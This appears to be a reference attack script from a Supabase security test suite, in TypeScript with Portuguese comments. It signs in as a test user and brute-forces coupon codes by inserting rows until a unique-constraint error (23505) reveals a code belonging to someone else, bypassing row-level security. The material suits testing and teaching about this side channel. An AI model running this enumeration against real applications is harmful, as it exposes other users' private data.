import { definirAtaque } from '../../cliente/supabase'

// Ataque de referência: o RLS esconde a linha, mas a restrição de valor único não.
// Tentar inserir um código que já existe dá o erro 23505, mesmo sendo de outra pessoa.
export default definirAtaque(async (supabase, responder) => {
  const { data } = await supabase.auth.signInWithPassword({ email: 'alice@exemplo.com', password: 'paodequeijo' })
  const eu = (data as { user: { id: string } }).user.id
  const meu = 'PADARIA-007'
  for (let n = 0; n < 1000; n++) {
    const codigo = `PADARIA-${String(n).padStart(3, '0')}`
    if (codigo === meu) continue
    const { error } = await supabase.from('cupons').insert({ user_id: eu, codigo, desconto: 0 })
    if (error?.code === '23505') {
      await responder(codigo)
      break
    }
  }
})
